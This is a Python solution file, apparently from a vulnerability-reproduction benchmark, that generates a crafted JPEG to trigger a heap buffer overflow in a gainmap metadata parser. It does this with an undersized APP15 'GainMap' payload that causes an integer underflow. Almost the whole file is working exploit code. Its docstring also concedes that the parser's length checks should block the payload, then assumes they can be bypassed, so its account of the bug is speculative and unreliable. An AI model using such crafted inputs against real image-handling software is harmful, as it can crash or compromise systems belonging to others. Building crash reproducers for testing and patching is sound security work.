import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for the Heap Buffer Overflow in decodeGainmapMetadata.

        The vulnerability is caused by an integer underflow when calculating the
        number of planes in a gainmap. The calculation is effectively:
        `num_planes = (payload_length - 60) / 4`.
        The types involved in the original C code (`unsigned int` and `ptrdiff_t`)
        lead to a signed subtraction. If `payload_length` is less than 60, the
        result is a negative number. This negative number, when cast to the
        unsigned type of `num_planes`, becomes a very large positive integer.
        A subsequent loop `for (i = 0; i < num_planes; i++)` then reads far beyond
        the bounds of the allocated buffer, causing a crash.

        To trigger this, `payload_length` must be less than 60. The vulnerable
        code contains checks that appear to prevent this (`if (data_length < 24)`
        and `if (data_length < 60)`). However, for the vulnerability to be
        reachable, these checks must be bypassable in the target environment.

        We construct a PoC with a payload length that:
        1. Is `>= 24` to pass the first check.
        2. Is `< 60` to cause the underflow.
        3. Satisfies `(payload_length - 60) % 4 == 0` to pass a modulo check.

        The smallest value for `payload_length` satisfying these conditions is 24.
        A payload of 24 bytes will result in `num_planes = (24 - 60) / 4 = -9`,
        which becomes a huge unsigned integer, triggering the heap-buffer-overflow.

        The PoC is a minimal but valid JPEG file containing a crafted APP15 ("GainMap")
        marker with a 24-byte payload.
        """
        
        # A minimal but valid JPEG structure is required for the parser
        # to reach the vulnerable code path in jpeg_read_header.
        
        # Start of Image
        poc = b'\xff\xd8'

        # APP15 Marker for GainMap. This must appear before SOF markers.
        # Marker: 0xFFEF
        # Identifier: "GainMap\x00" (8 bytes)
        # Payload: 24 bytes (to set data_length=24 for the underflow)
        gainmap_identifier = b'GainMap\x00'
        payload_len = 24
        payload = b'\x00' * payload_len
        
        app15_data = gainmap_identifier + payload
        # The length field in a JPEG marker is 2 bytes, big-endian, and
        # includes the size of the length field itself.
        app15_len = 2 + len(app15_data)

        poc += b'\xff\xef' + struct.pack('>H', app15_len) + app15_data

        # SOF0 (Start of Frame, Baseline DCT) - for a minimal 1x1 grayscale image.
        sof0 = (
            b'\xff\xc0'          # SOF0 marker
            b'\x00\x11'          # Length (17 bytes)
            b'\x08'              # Sample precision (8-bit)
            b'\x00\x01'          # Height (1px)
            b'\x00\x01'          # Width (1px)
            b'\x01'              # Number of components (1, for grayscale)
            b'\x01'              # Component ID
            b'\x11'              # Sampling factors (H=1, V=1)
            b'\x00'              # Quantization table ID
        )
        poc += sof0
        
        # DHT (Define Huffman Table) - A minimal but plausible table.
        dht = (
            b'\xff\xc4'          # DHT marker
            b'\x00\x1f'          # Length (31 bytes)
            b'\x00'              # Table class 0 (DC), table ID 0
            # 16 bytes for counts of codes of each length (1-16)
            b'\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00'
            # 12 bytes for the symbols, corresponding to the counts above
            b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b'
        )
        poc += dht

        # SOS (Start of Scan)
        sos = (
            b'\xff\xda'          # SOS marker
            b'\x00\x08'          # Length (8 bytes)
            b'\x01'              # Number of components in scan (1)
            b'\x01'              # Component selector
            b'\x00'              # Huffman table IDs (DC=0, AC=0)
            b'\x00'              # Start of spectral selection
            b'\x3f'              # End of spectral selection
            b'\x00'              # Successive approximation
        )
        poc += sos
        
        # EOI (End of Image)
        poc += b'\xff\xd9'

        return poc
